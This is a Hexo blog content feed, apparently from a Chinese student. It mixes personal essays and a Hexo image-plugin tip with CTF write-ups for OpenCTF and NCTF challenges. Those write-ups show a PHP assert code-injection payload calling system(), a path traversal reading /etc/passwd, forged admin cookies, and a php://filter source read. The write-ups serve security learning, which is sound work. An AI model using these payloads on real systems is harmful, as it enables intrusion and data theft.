<p>可以在做着不一样的事，可以有着不同认识的人，但是你会成为她的住所，会是她愿意回来且能感到安心的地方，你们之间可以有抱怨，但是没有猜疑；可以有嫌弃，但也有迷人的部分，仅此一人。每天重复着一样的动作，仅仅是吃饭睡觉一起上课，会显得疲倦，于是可以尝试着加些创意，因为有她，你有源源不断的点子，因为是她，所以你愿意去投入一定的时间去准备这些小惊喜，而在属于自己的时间，最大效率地完成学习，完成工作，成就自己。去打造深化自己拥有的也不断吸引着她的优点，去增强自己的能力以去更好地守护她，守护这段感情，守护自己。这个过程不会简单，其中必定会有不理解与小委屈，但是只要面对着对方的是真实的内心，这些都很容易解决。</p>
<p>也希望自己能够成长为可以独挡一面，成熟的人。</p>
<p>祝愿，祝福。    </p>
<p>以上。</p>
]]></content>
      
        <categories>
            
            <category> 煮字 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 绿生 </tag>
            
            <tag> 卡萨布兰卡 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[hexo博客图片问题解决办法]]></title>
      <url>/2017/07/12/blog-picture-issue/</url>
      <content type="html"><![CDATA[<p>关于hexo博客图片无法正常显示的问题的解决办法。   </p>
<a id="more"></a>
<p>之前一直用的MarkdownPad2自带的添加图片按钮来添加图片（存储在hexo/source/imag里），但是经常会有显示不出的情况，不喜欢用各大图床，于是查了一波本地存储上传的方法，找到了一个<a href="https://github.com/CodeFalling/hexo-asset-image" target="_blank" rel="external">插件</a>来修正img标签以使图片正常显示。  </p>
<p>参考自<a href="http://www.jianshu.com/p/c2ba9533088a" target="_blank" rel="external">简书</a>。   </p>
<h2 id="0x01-Asset设定确认"><a href="#0x01-Asset设定确认" class="headerlink" title="0x01 Asset设定确认"></a>0x01 Asset设定确认</h2><p>首先确认_config.yml 中有 post_asset_folder:true。<br>这时候每次hexo new会自动建立一个与文章同名的文件夹，我们可以把与该文章相关的所有资源都放到那个文件夹，来更方便得调用资源。     </p>
<h2 id="0x02-插件添加"><a href="#0x02-插件添加" class="headerlink" title="0x02 插件添加"></a>0x02 插件添加</h2><p>在hexo文件夹执行：  </p>
<blockquote>
<p>   npm install <a href="https://github.com/CodeFalling/hexo-asset-image" target="_blank" rel="external">https://github.com/CodeFalling/hexo-asset-image</a> –save</p>
</blockquote>
<h2 id="0x03-图片添加"><a href="#0x03-图片添加" class="headerlink" title="0x03 图片添加"></a>0x03 图片添加</h2><p>完成安装后新建一个文件试试，发现在.md文件同级目录下会有一个同名文件夹。<br>比如我们新建了一个文件blog-picture-issue.md，然后在同名文件夹里放张图：1.png。   </p>
<p>之后在原图片引用语句的括号里写入：  </p>
<blockquote>
<p>   blog-picture-issue/1.PNG</p>
</blockquote>
<p>就能看到正常显示的图片了：   </p>
<p><img src="/2017/07/12/blog-picture-issue/1.png" alt="">    </p>
<p>注：[]里是图片的名称，可不写。   </p>
<h2 id="0x04-issued"><a href="#0x04-issued" class="headerlink" title="0x04 issued"></a>0x04 issued</h2><p>这样的操作以后生成的html是：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;<span class="selector-tag">img</span> src=<span class="string">"/2017/07/12/blog-picture-issue/1.PNG"</span> alt=<span class="string">"logo"</span>&gt;</div></pre></td></tr></table></figure></p>
<p>而非之前的：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;<span class="selector-tag">img</span> src=<span class="string">"blog-picture-issue/1.PNG"</span> alt=<span class="string">"logo"</span>&gt;”</div></pre></td></tr></table></figure></p>
<p>使得图片正常显示。</p>
]]></content>
      
        <categories>
            
            <category> Hexo </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[OpenCTF WriteUp]]></title>
      <url>/2017/07/03/OpenCTF/</url>
      <content type="html"><![CDATA[<p>软件嘉年华部分题的题解。</p>
<a id="more"></a>
<p><a href="http://hdopen.xctf.org.cn/" target="_blank" rel="external">http://hdopen.xctf.org.cn/</a></p>
<h1 id="一、WEB"><a href="#一、WEB" class="headerlink" title="一、WEB"></a>一、WEB</h1><h2 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h2><p>URL: <a href="http://202.112.51.184:8001" target="_blank" rel="external">http://202.112.51.184:8001</a></p>
<p>参考链接： <a href="https://github.com/bl4de/ctf/blob/master/2016/CSAW_CTF_2016/mfw/mfw_web125.md" target="_blank" rel="external">https://github.com/bl4de/ctf/blob/master/2016/CSAW_CTF_2016/mfw/mfw_web125.md</a>    </p>
<p>在about页面看到：<br><figure class="highlight haml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">I used:   </div><div class="line">  -<span class="ruby"> Git   </span></div><div class="line">  -<span class="ruby"> PHP   </span></div><div class="line">  -<span class="ruby"> Bootstrap</span></div></pre></td></tr></table></figure></p>
<p>先从/.git里拖个源码，这里用的<a href="https://github.com/lijiejie/GitHack" target="_blank" rel="external">GitHack</a>：   </p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GitHack<span class="selector-class">.py</span> http:<span class="comment">//202.112.51.184:8001/.git/</span></div></pre></td></tr></table></figure>
<p>flag.php里的：     </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">// TODO</span></div><div class="line"><span class="comment">// $FLAG = '';</span></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>index.php里的关键代码：      </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>])) &#123;</div><div class="line">	$page = $_GET[<span class="string">'page'</span>];</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">	$page = <span class="string">"home"</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$file = <span class="string">"templates/"</span> . $page . <span class="string">".php"</span>;</div><div class="line"></div><div class="line"><span class="comment">// I heard '..' is dangerous!</span></div><div class="line">assert(<span class="string">"strpos('$file', '..') === false"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Detected hacking attempt!"</span>);</div><div class="line"></div><div class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></div><div class="line">assert(<span class="string">"file_exists('$file')"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"That file doesn't exist!"</span>);</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="keyword">require_once</span> $file;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>比较菜只能做到这里。之后一叶知秋利用<a href="http://123.206.203.108/index.php/archives/15/" target="_blank" rel="external">assert函数引起的代码注射</a>构造payload：<br><figure class="highlight ada"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?page='.system(<span class="string">"cd /var/www/html/;git diff;"</span>).<span class="symbol">'about</span></div></pre></td></tr></table></figure></p>
<p>得到<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">diff --git a/templates/flag.php b/templates/flag.php</div><div class="line">index f8c9436.<span class="number">.1</span>d552ec <span class="number">100644</span></div><div class="line">--- a/templates/flag.php</div><div class="line">+++ b/templates/flag.php</div><div class="line">@@ <span class="number">-1</span>,<span class="number">4</span> +<span class="number">1</span> @@</div><div class="line">-<span class="meta">&lt;?php</span></div><div class="line">-<span class="comment">// TODO</span></div><div class="line">-<span class="comment">// $FLAG = '';</span></div><div class="line">-<span class="meta">?&gt;</span></div><div class="line">+<span class="meta">&lt;?php</span> $FLAG=<span class="string">"xctf&#123;392dba36b0998deac2ed87ceca63c4b2&#125;"</span>; <span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<ul>
<li>关于payload里的”/var/www/html/“，可以看看<a href="https://stackoverflow.com/questions/16197663/what-is-var-www-html" target="_blank" rel="external">https://stackoverflow.com/questions/16197663/what-is-var-www-html</a></li>
</ul>
<h2 id="web150-400"><a href="#web150-400" class="headerlink" title="web150, 400"></a>web150, 400</h2><p>URL: <a href="http://202.112.51.184:8002/" target="_blank" rel="external">http://202.112.51.184:8002/</a>    </p>
<p>参考链接：     </p>
<ol>
<li><a href="https://thegoonies.rocks/csaw-2016-wtf-sh-web/" target="_blank" rel="external">https://thegoonies.rocks/csaw-2016-wtf-sh-web/</a>            </li>
<li><a href="https://github.com/ernw/ctf-writeups/tree/master/csaw2016/wtf.sh" target="_blank" rel="external">https://github.com/ernw/ctf-writeups/tree/master/csaw2016/wtf.sh</a>     </li>
</ol>
<p>web150和web400这两题在上面的链接里都有详细的解答过程，这里稍微记录一下。</p>
<p>题目里有个登陆页面，想到passwd文件存放在/etc目录下，尝试构造     </p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http:<span class="regexp">//</span><span class="number">202.112</span>.<span class="number">51.184</span>:<span class="number">8002</span><span class="regexp">/profile.wtf?user=../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/etc/</span>passwd</div></pre></td></tr></table></figure>
<p>得到响应：   </p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">root:</span><span class="symbol">x:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash<span class="string">'s posts:</span></span></div></pre></td></tr></table></figure>
<p>再尝试读取   </p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span><span class="comment">//202.112.51.184:8002/post.wtf?post=../users/</span></div></pre></td></tr></table></figure>
<p>拉下来的列表里有一条包含admin的hash值与id的信息：        </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"post"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"post-poster"</span>&gt;</span>Posted by <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/profile.wtf?user=Cv3uk"</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"post-title"</span>&gt;</span>822ec9ffd8e2e720b59e75d5c9047d690747af3e<span class="tag">&lt;/<span class="name">span</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"post-body"</span>&gt;</span>tENOEU4RlJqSGPJn1O/eNASiC89NL699v96lgpg1muh5jqIq/oDjonRho8mvT6wB30xNnloGtRUBRBbT8ub0MA==<span class="tag">&lt;/<span class="name">span</span>&gt;</span></div></pre></td></tr></table></figure>
<p>进入admin相关页面<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span><span class="comment">//202.112.51.184:8002/profile.wtf?user=Cv3uk</span></div></pre></td></tr></table></figure></p>
<p>然后伪造下cookie：</p>
<pre><code>1. USERNAME = admin
2. __cfduid = 822ec9ffd8e2e720b59e75d5c9047d690747af3e
3. TOKEN = tENOEU4RlJqSGPJn1O/eNASiC89NL699v96lgpg1muh5jqIq/oDjonRho8mvT6wB30xNnloGtRUBRBbT8ub0MA==
</code></pre><p>最后在页面底部拿到flag。   </p>
<p><img src="/2017/07/03/OpenCTF/1.png" alt="web150">  </p>
<p>400分的题水平不够没写出来，看看上面的wp吧。</p>
<h2 id="web200"><a href="#web200" class="headerlink" title="web200"></a>web200</h2><p>URL: <a href="http://202.112.51.184:8000/cgi-bin/forms.pl" target="_blank" rel="external">http://202.112.51.184:8000/cgi-bin/forms.pl</a><br>原题： <a href="https://github.com/isislab/CSAW-CTF-2016-Quals/tree/master/Web/I%20Got%20Id" target="_blank" rel="external">https://github.com/isislab/CSAW-CTF-2016-Quals/tree/master/Web/I%20Got%20Id</a>   </p>
<p>没太看懂解法，还在问土土师傅，之后补充。</p>
<h1 id="二、Crypto"><a href="#二、Crypto" class="headerlink" title="二、Crypto"></a>二、Crypto</h1><h2 id="crypto-100"><a href="#crypto-100" class="headerlink" title="crypto 100"></a>crypto 100</h2><p>小明今天去妹纸家开Party,而妹纸却给他出了一个谜语,说只要他能答出来,她就会答应小明一个要求.  </p>
<p>这是妹纸给小明的谜语序列:EW91X2FYZV9HX2DVB2RFYM95=    </p>
<p>适当把大写字母改成小写然后base64解一下就可以了。  </p>
<h2 id="crypto-150"><a href="#crypto-150" class="headerlink" title="crypto 150"></a>crypto 150</h2><p>URL: <a href="http://hdopen.xctf.org.cn/media/task/58f1ec51-bf9e-43fa-bd77-c1cc423e3cf4.rar" target="_blank" rel="external">http://hdopen.xctf.org.cn/media/task/58f1ec51-bf9e-43fa-bd77-c1cc423e3cf4.rar</a>     </p>
<p>分享一份veritas501关于带密码压缩包题的思路整理：<br><a href="http://veritas501.space/2017/06/23/给你压缩包却不给你密码的人到底在想什么/#more" target="_blank" rel="external">http://veritas501.space/2017/06/23/给你压缩包却不给你密码的人到底在想什么/#more</a></p>
<p>这题采用的是crc32碰撞法。  </p>
]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ctf </tag>
            
            <tag> writeup </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[菠萝牛肉饭]]></title>
      <url>/2017/07/02/tea-maker/</url>
      <content type="html"><![CDATA[<p>菠萝，青菜，牛肉，米饭，芝麻，番茄蛋汤。      </p>
<a id="more"></a>   
<h2 id="一、番茄蛋汤精灵"><a href="#一、番茄蛋汤精灵" class="headerlink" title="一、番茄蛋汤精灵"></a>一、番茄蛋汤精灵</h2><p>挺喜欢香港岛的老板的，一个带点广东口音的大叔，店里有鱼有猫，靠近门口的地方有张小桌子，上面堆了些有种年代意象的玩物，平时戴着细框眼镜，很是友好，买单时会跟你说谢谢，很平静的那种，静到直深心骨，声音有种大漠般的饱满，总之光那几声谢谢，也会再一次进店享食。   </p>
<p>在这里用餐还是挺奢侈的，两个人可以吃到50+，但是东西量很足，第一次来点菜难免会浪费，量足的同时味也很足，整个店都有老板的那种气质，印象比较深的便是那份菠萝牛肉饭，汁液包裹着菠萝青菜与牛肉，这些食材的味道又锁在了汤汁里，交错相关，很是融洽。米饭虽也在一个盘子里却保持着很难得的干净，夫人会很喜欢这样的米饭，有着它该有的独立剔透的味道。我比较喜欢喝汤，所以这份饭到最后基本会被我用汤汁浇淋全身，米香即被困在了一层透明丝滑之下。吃得很愉快。老板娘还很贴心的送了份番茄蛋汤，味道也很出色。说到番茄蛋汤，不得不提一下番茄蛋汤精灵@Acaleph，靠一碗汤就可以让我吃完一顿饭的水母宝贝。   </p>
<p>“成为优秀厨师的诀窍就是…遇上一个足以让你想要将自己所有的料理，都献给她的女人。” —— 食戟之灵    </p>
<p>最早来这里是橙子介绍的，喝的生滚粥，肉片煮得很有力度，量也很够，一份粥两个人也可以吃饱。里边还有几片生菜，妖娆得躺在粥里，忍不住想揪出来咬几口。生滚粥当然主要品的是粥啦，粥也是很棒，记得连续吃了好几天，它与盛放它的黑色砂锅有着相近的味道，也表现着老板的那种气质——饱满沧桑却近人有力。   </p>
<p>在这里，食物有着它该有的味道。在吃腻了外卖的那种干燥后，很长一段时间胃口处于闭塞的状态，偶然点的一份菠萝牛肉饭，解锁了一些新的体验。  </p>
<p><img src="/2017/07/02/tea-maker/29.png" alt="食戟之灵"></p>
<h2 id="二、点亮宿舍的柠檬"><a href="#二、点亮宿舍的柠檬" class="headerlink" title="二、点亮宿舍的柠檬"></a>二、点亮宿舍的柠檬</h2><p>由随手翻倒的满杯的柠檬绿茶所释放的意象怪物。     </p>
<p>某家店的饮品里常常会放入大只的果块果片，基本啃完了水果茶水也就剩下一点，放了冰块的东西得趁冷喝，热了化了淡了，这杯饮品迷人的地方就少了，那种有点先前的调味但是又掺杂着融化的人工冰块的塑料味的东西，不是很能接受，以后也不会。   </p>
<p>急着开电脑打翻了杯刚买的柠檬茶，不开心，其实最近遇到了很多不顺心的事，知道要去调整，却惰于烦躁与抱怨。倒翻的绿茶很无意地点亮了这个地方，擦干地面的时候，有很舒服的味道充盈着这间屋子，降温消燥，忙着期末考好久未拖的地，也趁着这个机会干净了一把。    </p>
<p><del>看似坏的东西也不一定全是坏事，也可能是以一小部分的坏抵消了一大部分的坏也说不准。</del> 看起来有点像毒鸡汤，于是上个删除线。不会喜欢鸡汤类的东西，并不是那么适合大部分人，有时候还会变成强扭某种境遇的措辞，看着不是很舒服。当然翻倒的柠檬水的清香是真，这个体验是真实存在的，也的确愉悦了一会儿，再过一会儿味道没了，便又回到了一股燥热中。以及地面似乎没拖干净，黏，乎，乎……</p>
]]></content>
      
        <categories>
            
            <category> 煮字 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 绿生 </tag>
            
            <tag> 柠檬之涩 </tag>
            
            <tag> 番茄蛋汤 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[NCTF WriteUp]]></title>
      <url>/2017/06/01/NCTF/</url>
      <content type="html"><![CDATA[<p>南邮NCTF训练平台里一些题的wp。     </p>
<a id="more"></a>  
<p><a href="http://ctf.nuptsast.com/" target="_blank" rel="external">http://ctf.nuptsast.com/</a></p>
<h2 id="签到2"><a href="#签到2" class="headerlink" title="签到2"></a>签到2</h2><p>URL: <a href="http://teamxlc.sinaapp.com/web1/02298884f0724c04293b4d8c0178615e/index.php" target="_blank" rel="external">http://teamxlc.sinaapp.com/web1/02298884f0724c04293b4d8c0178615e/index.php</a>  </p>
<p>得到这样一个页面：  </p>
<p><img src="/2017/06/01/NCTF/web1.png" alt="">  </p>
<p>尝试输入：zhimakaimen<br>但是发现输入到倒数第二个e就输入不下去了，F12：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>输入框：<span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">""</span> <span class="attr">name</span>=<span class="string">"text1"</span> <span class="attr">maxlength</span>=<span class="string">"10"</span> <span class="attr">type</span>=<span class="string">"password"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></div><div class="line">请输入口令：zhimakaimen   </div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">"开门"</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>把maxlength改成100，重新输入口令得到flag。   </p>
<h2 id="这题不是WEB"><a href="#这题不是WEB" class="headerlink" title="这题不是WEB"></a>这题不是WEB</h2><p>URL: <a href="http://chinalover.sinaapp.com/web2/index.html" target="_blank" rel="external">http://chinalover.sinaapp.com/web2/index.html</a>   </p>
<p>打开后是一张gif猫，下载到本地。记事本打开得到flag：   </p>
<h2 id="层层递进"><a href="#层层递进" class="headerlink" title="层层递进"></a>层层递进</h2><p>URL: <a href="http://chinalover.sinaapp.com/web3/" target="_blank" rel="external">http://chinalover.sinaapp.com/web3/</a>  </p>
<p>进去是个企业网站，一开始F12没啥发现，看了WP才知道要访问：   <a href="http://chinalover.sinaapp.com/web3/404.html" target="_blank" rel="external">http://chinalover.sinaapp.com/web3/404.html</a><br>再去F12看看发现有一个404.html的页面状态码是304，也是个思路吧，没找仔细…..</p>
<p>得到源码：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span></div><div class="line"><span class="comment">&lt;!-- Placed at the end of the document so the pages load faster --&gt;</span></div><div class="line"><span class="comment">&lt;!--  </span></div><div class="line">&lt;script src="./js/jquery-n.7.2.min.js"&gt;&lt;/script&gt;</div><div class="line">&lt;script src="./js/jquery-c.7.2.min.js"&gt;&lt;/script&gt;</div><div class="line">&lt;script src="./js/jquery-t.7.2.min.js"&gt;&lt;/script&gt;</div><div class="line">&lt;script src="./js/jquery-f.7.2.min.js"&gt;&lt;/script&gt;</div><div class="line">&lt;script src="./js/jquery-&#123;.7.2.min.js"&gt;&lt;/script&gt;</div><div class="line">&lt;script src="./js/jquery-t.7.2.min.js"&gt;&lt;/script&gt;</div><div class="line">&lt;script src="./js/jquery-h.7.2.min.js"&gt;&lt;/script&gt;</div><div class="line">&lt;script src="./js/jquery-i.7.2.min.js"&gt;&lt;/script&gt;</div><div class="line">&lt;script src="./js/jquery-s.7.2.min.js"&gt;&lt;/script&gt;</div><div class="line">&lt;script src="./js/jquery-_.7.2.min.js"&gt;&lt;/script&gt;</div><div class="line">&lt;script src="./js/jquery-i.7.2.min.js"&gt;&lt;/script&gt;</div><div class="line">&lt;script src="./js/jquery-s.7.2.min.js"&gt;&lt;/script&gt;</div><div class="line">&lt;script src="./js/jquery-_.7.2.min.js"&gt;&lt;/script&gt;</div><div class="line">&lt;script src="./js/jquery-a.7.2.min.js"&gt;&lt;/script&gt;</div><div class="line">&lt;script src="./js/jquery-_.7.2.min.js"&gt;&lt;/script&gt;</div><div class="line">&lt;script src="./js/jquery-f.7.2.min.js"&gt;&lt;/script&gt;</div><div class="line">&lt;script src="./js/jquery-l.7.2.min.js"&gt;&lt;/script&gt;</div><div class="line">&lt;script src="./js/jquery-4.7.2.min.js"&gt;&lt;/script&gt;</div><div class="line">&lt;script src="./js/jquery-g.7.2.min.js"&gt;&lt;/script&gt;</div><div class="line">&lt;script src="./js/jquery-&#125;.7.2.min.js"&gt;&lt;/script&gt;</div><div class="line">--&gt;</div></pre></td></tr></table></figure></p>
<p>手打flag：<br><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag:nctf&#123;<span class="keyword">this</span><span class="number">_</span><span class="keyword">is</span><span class="number">_</span>a<span class="number">_f</span>l<span class="number">4</span>g&#125;</div></pre></td></tr></table></figure></p>
<h2 id="AAencode"><a href="#AAencode" class="headerlink" title="AAencode"></a>AAencode</h2><p>URL: <a href="http://chinalover.sinaapp.com/web20/aaencode.txt" target="_blank" rel="external">http://chinalover.sinaapp.com/web20/aaencode.txt</a>   </p>
<p>查了下AAencode，找到一个在线解密网址：<br><a href="http://utf-8.jp/public/aaencode.html" target="_blank" rel="external">http://utf-8.jp/public/aaencode.html</a>     </p>
<p>贴进去跑跑就可以了。</p>
<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>URL: <a href="http://4.chinalover.sinaapp.com/web7/index.php" target="_blank" rel="external">http://4.chinalover.sinaapp.com/web7/index.php</a>  </p>
<blockquote>
<ol>
<li>分享篇关于文件包含的文章：<br><a href="https://dollberg.xyz/ctf/2016/12/29/33C3-CTF-list0r/" target="_blank" rel="external">https://dollberg.xyz/ctf/2016/12/29/33C3-CTF-list0r/</a>  </li>
<li>然后是php官方手册：<br><a href="http://php.net/manual/zh/wrappers.php.php" target="_blank" rel="external">http://php.net/manual/zh/wrappers.php.php</a>   </li>
</ol>
</blockquote>
<p><br></p>
<p>通过伪协议读个源码：<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=index.php</div></pre></td></tr></table></figure></p>
<p>得到base64加密后的字符串：<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">PGh<span class="number">0</span>bWw+CiAgICA<span class="number">8</span>dGl<span class="number">0</span>bGU+YXNkZjwvdGl<span class="number">0</span>bGU+CiAgICAKPD<span class="number">9</span>waHAKCWVycm<span class="number">9</span>yX<span class="number">3</span>JlcG<span class="number">9</span>ydGluZygwKTsKCWlmKCEkX<span class="number">0</span>dFVFtmaWxlXSl<span class="number">7</span>ZWNobyAnPGEgaHJlZj<span class="number">0</span>iL<span class="keyword">i9</span>pbmRleC<span class="number">5</span>waHA/ZmlsZT<span class="number">1</span>zaG<span class="number">93</span>LnBocCI+Y<span class="number">2</span>xpY<span class="number">2</span>sgbWU/IG<span class="number">5</span>vPC<span class="number">9</span>hPic<span class="number">7</span>fQoJJGZpbGU<span class="number">9</span>JF<span class="number">9</span>HRVRbJ<span class="number">2</span>ZpbGUnXTsKCWlmKHN<span class="number">0</span>cnN<span class="number">0</span>cigkZmlsZSwiL<span class="keyword">i4</span>vIil<span class="number">8</span>fHN<span class="number">0</span>cmlzdHIoJGZpbGUsICJ<span class="number">0</span>cCIpfHxzdHJpc<span class="number">3</span>RyKCRmaWxlLCJpbnB<span class="number">1</span>dCIpfHxzdHJpc<span class="number">3</span>RyKCRmaWxlLCJkYXRhIikpewoJCWVjaG<span class="number">8</span>gIk<span class="number">9</span>oIG<span class="number">5</span>vISI<span class="number">7</span>CgkJZXhpdCgpOwoJfQoJaW<span class="number">5</span>jbHVkZSgkZmlsZSk<span class="number">7</span>IAovL<span class="number">2</span>ZsYWc<span class="number">6</span>bmN<span class="number">0</span>ZntlZHVsY<span class="number">25</span>pX<span class="number">2</span>VsaWZfbGFjb<span class="number">2</span>xfc<span class="number">2</span>lfc<span class="number">2</span>lodH<span class="number">0</span>KCj<span class="number">8</span>+CjwvaHRtbD<span class="number">4</span>=</div></pre></td></tr></table></figure></p>
<p>解密后：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line">   <span class="tag">&lt;<span class="name">title</span>&gt;</span>asdf<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"></div><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line"><span class="keyword">if</span>(!$_GET[file])&#123;<span class="keyword">echo</span> <span class="string">'&lt;a href="./index.php?file=show.php"&gt;click me? no&lt;/a&gt;'</span>;&#125;</div><div class="line">$file=$_GET[<span class="string">'file'</span>];</div><div class="line"><span class="keyword">if</span>(strstr($file,<span class="string">"../"</span>)||stristr($file, <span class="string">"tp"</span>)||stristr($file,<span class="string">"input"</span>)||stristr($file,<span class="string">"data"</span>))&#123;</div><div class="line">	<span class="keyword">echo</span> <span class="string">"Oh no!"</span>;</div><div class="line">	<span class="keyword">exit</span>();</div><div class="line">&#125;</div><div class="line"><span class="keyword">include</span>($file);</div><div class="line"><span class="comment">//flag:nctf&#123;edulcni_elif_lacol_si_siht&#125;</span></div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure></p>
<h2 id="Download"><a href="#Download" class="headerlink" title="Download~!"></a>Download~!</h2><p>URL: <a href="http://way.nuptzj.cn/web6/" target="_blank" rel="external">http://way.nuptzj.cn/web6/</a></p>
